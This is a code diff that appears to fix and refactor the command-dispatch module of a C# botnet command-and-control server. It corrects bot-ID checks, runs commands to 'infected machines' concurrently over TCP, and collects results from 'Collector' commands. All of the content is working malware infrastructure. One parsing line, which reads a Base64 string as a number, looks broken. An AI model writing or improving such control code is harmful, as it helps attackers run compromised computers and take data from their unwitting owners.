@@ -21,7 +21,7 @@ namespace CnC_Server.Options
     {
         private Dictionary<string, Command> Commands;
         private List<Infected_Machine> Bots;
-        private Task[] ExecutionThreadPool;
+        private List<Task> ExecutionThreadPool;
 
         private string CommandName;
         private int BotID;
@@ -31,7 +31,7 @@ namespace CnC_Server.Options
         {
             this.Commands = commands;
             this.Bots = bots;
-            this.ExecutionThreadPool = new Task[10];
+            this.ExecutionThreadPool = new List<Task>();
         }
 
         public bool ParseArguments(string[] arguments)
@@ -45,10 +45,10 @@ namespace CnC_Server.Options
             else if(arguments.Length == 2 &&
                 Commands.ContainsKey(arguments[0]) &&
                 int.Parse(arguments[1]) <= Bots.Count &&
-                int.Parse(arguments[1]) > Bots.Count)
+                int.Parse(arguments[1]) > 0)
             {
                 SetCommandName(arguments[0]);
-                SetBotID(int.Parse(arguments[1]));
+                SetBotID(int.Parse(arguments[1]) - 1);
                 return true;
             }
 
@@ -66,15 +66,15 @@ namespace CnC_Server.Options
             {
                 for (int i = 0; i < Bots.Count; i++)
                 {
-                    ExecutionThreadPool[i] = Task.Factory.StartNew(SendSingleBot, i);
+                    ExecutionThreadPool.Add(Task.Factory.StartNew(SendSingleBot, i));
                 }
             }
             else
             {
-                SendSingleBot(BotID);
+                ExecutionThreadPool.Add(Task.Factory.StartNew(SendSingleBot, BotID));
             }
 
-            Task.WaitAll(ExecutionThreadPool);
+            Task.WaitAll(ExecutionThreadPool.ToArray());
 
             if (Commands[CommandName] is Executer)
             {
@@ -96,29 +96,29 @@ namespace CnC_Server.Options
         {
             try
             {
-                /* Connect to the requested bot */
-                IPEndPoint remoteEndPoint = new IPEndPoint(Convert.ToInt64(Bots[(int)botID].ip), Bots[(int)botID].port);
-                Socket commandMessage = new Socket(remoteEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                // Connect to the request bot
+                TcpClient tcpClient = new TcpClient(Bots[(int)botID].ip, Bots[(int)botID].port);
 
                 MemoryStream fs = new MemoryStream();
                 BinaryFormatter formatter = new BinaryFormatter();
                 formatter.Serialize(fs, Commands[CommandName]);
                 byte[] buffer = fs.ToArray();
-                commandMessage.Send(buffer);
+                tcpClient.GetStream().Write(buffer, 0, buffer.Length);
 
                 if (Commands[CommandName] is Collector) 
                 {
                     byte[] response = new byte[2048];
-                    commandMessage.Receive(response); // Get the result of the command execution from the bot
+                    
+                    tcpClient.GetStream().Read(response, 0, response.Length); // Get the result of the command execution from the bot
 
-                    /* Update the locally saved data to the result received from the command */
+                    // Update the locally saved data to the result received from the command
                     if (!Bots[(int)botID].SetNewValue(CommandName, double.Parse(Convert.ToBase64String(response))))
                     {
                         Console.WriteLine("Error setting the new value returned!");
                     }
                 }
 
-                commandMessage.Close();
+                tcpClient.Close();
             }
             catch (Exception)
             {
@@ -134,7 +134,7 @@ namespace CnC_Server.Options
             }
             else
             {
-                Bots.RemoveAt(BotID - 1);
+                Bots.RemoveAt(BotID);
             }
         }
     }
